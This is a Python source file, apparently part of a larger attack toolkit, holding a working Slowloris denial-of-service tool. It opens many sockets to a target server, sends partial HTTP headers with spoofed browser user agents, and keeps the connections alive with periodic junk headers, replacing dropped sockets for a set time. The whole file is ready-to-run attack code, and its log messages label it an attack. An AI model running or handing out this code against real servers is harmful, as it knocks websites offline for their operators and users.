import socket
import random
import time
import threading
from core.colors import log_info, log_success, log_warning, log_danger

class Layer7Special:
    def __init__(self, target_ip, target_port=80, sockets=200, time=300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sockets_count = sockets
        self.time = time
        self.list_of_sockets = []

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
        ]

    def init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.target_ip, self.target_port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\\r\\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(self.user_agents)}\\r\\n".encode("utf-8"))
        s.send("{}\\r\\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def slowloris_worker(self):
        log_info(f"Setting up {self.sockets_count} sockets for Slowloris...")
        for _ in range(self.sockets_count):
            try:
                s = self.init_socket()
                self.list_of_sockets.append(s)
            except Exception:
                break

        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                log_info(f"Sending keep-alive headers to {len(self.list_of_sockets)} sockets...")
                for s in list(self.list_of_sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\\r\\n".encode("utf-8"))
                    except socket.error:
                        self.list_of_sockets.remove(s)

                # Recreate dead sockets
                for _ in range(self.sockets_count - len(self.list_of_sockets)):
                    try:
                        s = self.init_socket()
                        if s:
                            self.list_of_sockets.append(s)
                    except Exception:
                        break

                time.sleep(15)  # Send a small header every 15 seconds to keep connection alive
            except Exception:
                pass

    def run_slowloris(self):
        log_info(f"Starting SLOWLORIS attack on {self.target_ip}:{self.target_port} for {self.time}s...")
        t = threading.Thread(target=self.slowloris_worker)
        t.start()
        t.join()
        log_success("Slowloris Attack Finished.")
